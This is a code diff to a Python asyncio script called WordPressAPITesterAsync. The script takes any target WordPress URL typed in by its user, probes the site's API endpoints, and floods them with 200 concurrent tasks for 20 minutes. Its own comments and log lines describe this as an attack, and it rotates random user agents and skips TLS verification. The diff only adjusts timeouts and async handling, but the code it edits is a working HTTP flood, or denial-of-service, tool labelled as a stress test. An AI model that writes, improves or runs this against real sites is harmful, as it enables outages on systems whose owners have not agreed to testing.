@@ -88,7 +88,7 @@ class WordPressAPITesterAsync:
                 response = requests.head(
                     full_url,
                     headers={"User-Agent": self.get_random_user_agent()},
-                    timeout=3,
+                    timeout=10,  # Tingkatkan timeout menjadi 10 detik
                     verify=False,
                     allow_redirects=True
                 )
@@ -99,28 +99,25 @@ class WordPressAPITesterAsync:
                 logger.error(f"Failed to verify endpoint {endpoint}: {e}")
         return valid_endpoints or self.endpoints
 
-    def flood_async(self, url, workers=100, duration=3600):
+    async def flood_async(self, url, workers=100, duration=3600):
         logger.info(f"[INFO] Starting async stress test on {url} for {duration}s with {workers} tasks")
         valid_endpoints = self.discover_valid_endpoints(url)
         if not valid_endpoints:
             logger.error("[ERROR] No valid endpoints found. Aborting test.")
             return
+        
         self.endpoints = valid_endpoints
-        asyncio.run(asyncio.gather(*[self.attack_async(url, self.endpoints, duration) for _ in range(workers)]))
+        tasks = [self.attack_async(url, self.endpoints, duration) for _ in range(workers)]
+        await asyncio.gather(*tasks)
 
-def main():
+async def main():
     target_url = input("Masukkan Target URL WordPress (e.g., https://example.com): ").strip()
     if not (target_url.startswith("http://") or target_url.startswith("https://")):
         logger.error("[ERROR] URL tidak valid. Harap sertakan http:// atau https://")
         return
     
-    try:
-        tester = WordPressAPITesterAsync()
-        tester.flood_async(target_url, workers=200, duration=1200)  # Serangan selama 20 menit
-    except KeyboardInterrupt:
-        logger.info("\n[INFO] Attack interrupted by user.")
-    except Exception as e:
-        logger.error(f"[ERROR] Unexpected error occurred: {e}")
+    tester = WordPressAPITesterAsync()
+    await tester.flood_async(target_url, workers=200, duration=1200)  # Serangan selama 20 menit
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
